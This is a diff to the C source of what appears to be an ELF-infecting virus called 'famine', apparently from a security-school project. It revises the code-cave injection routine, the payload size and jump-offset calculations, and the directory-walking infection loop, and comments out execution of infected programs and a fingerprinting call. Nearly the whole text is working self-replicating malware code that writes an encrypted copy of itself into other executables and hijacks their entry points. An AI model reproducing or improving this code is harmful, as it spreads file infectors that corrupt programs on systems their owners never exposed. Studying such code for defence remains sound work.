@@ -17,14 +17,17 @@
 
 extern void end();
 void famine(void);
+void jmp_end(void);
 
 #define JMP_OFFSET 0x6
 #define JMP_SIZE 4
 
 void	__attribute__((naked)) _start(void)
 {
-	__asm__ ("call famine\n"
-			 "jmp end    \n");
+	__asm__ (".global jmp_end	\n"
+			 "call famine		\n"
+			 "jmp_end:			\n"
+			 "jmp end			\n");
 }
 
 static int	patch_new_file(t_data *data, const char *filename) {
@@ -115,11 +118,13 @@ static int	inject(t_data *data) {
 
 	packer_patch(data);
 
-	data->cave.rel_jmp = (int32_t)calc_jmp(data->cave.addr, data->packer.old_entry, JMP_OFFSET + JMP_SIZE);
+	uint8_t jmp_offset = (char *)&jmp_end - (char *)&_start + 1;
+
+	data->cave.rel_jmp = (int32_t)calc_jmp(data->cave.addr, data->packer.old_entry, jmp_offset + JMP_SIZE);
 
 	ft_memcpy(data->file + data->cave.offset, &_start, data->cave.p_size);
 
-	ft_memcpy(data->file + data->cave.offset + JMP_OFFSET, &data->cave.rel_jmp, JMP_SIZE);
+	ft_memcpy(data->file + data->cave.offset + jmp_offset, &data->cave.rel_jmp, JMP_SIZE);
 
 	encrypt(data->file + data->cave.offset, data->cave.p_size, data->patch.key);
 
@@ -151,7 +156,7 @@ static int	infect(const char *filename, const char *self_name)
 	ft_strlcpy(data.self_name, self_name, sizeof(data.self_name));
 
 	/* calculate the size of the payload before the mapping */
-	data.cave.p_size = (size_t)&end - (size_t)&_start;
+	data.cave.p_size = (char *)&end - (char *)&_start;
 
 	if (map_file(filename, &data) != 0) {
 		return 1;
@@ -185,10 +190,6 @@ static int execute_program(const char *filename)
 	pid_t pid = _syscall(SYS_fork);
 	if (pid == 0) {
 
-		/* doable */
-		//_syscall(SYS_close, 0);
-		//_syscall(SYS_close, 1);
-		//_syscall(SYS_close, 2);
 		const char dev_null[] = "/dev/null";
 		int fd = _syscall(SYS_open, dev_null, O_RDONLY);
 		if (fd < 0)
@@ -224,11 +225,11 @@ static int execute_program(const char *filename)
 	return 0;
 }
 
-static void	open_file(const char *file, const char *self_path, size_t *counter)
+static void open_file(const char *file, const char *self_path, size_t *counter)
 {
 
 	int fd = _syscall(SYS_open, file, O_RDONLY);
-	if (fd < 0)
+	if (fd == -1)
 		return ;
 
 	char buf[PATH_MAX];
@@ -255,7 +256,7 @@ static void	open_file(const char *file, const char *self_path, size_t *counter)
 
 				if (infect(new_path, self_path) == 0) {
 					(*counter)++;
-					execute_program(new_path);
+//					execute_program(new_path);
 				}
 
 			} else if (dir->d_type == DT_DIR) {
@@ -269,12 +270,12 @@ static void	open_file(const char *file, const char *self_path, size_t *counter)
 	}
 
 	_syscall(SYS_close, fd);
+
 }
 
 void	famine(void)
 {
-	if (pestilence() != 0)
-		return ;
+
 
 	size_t counter = 0;
 	char host_name[PATH_MAX];
@@ -293,7 +294,7 @@ void	famine(void)
 	for (int i = 0; paths[i]; ++i)
 		open_file(paths[i], host_name, &counter);
 
-	if (counter != 0) {
-		self_fingerprint(host_name, counter);
-	}
+//	if (counter != 0) {
+//		self_fingerprint(host_name, counter);
+//	}
 }
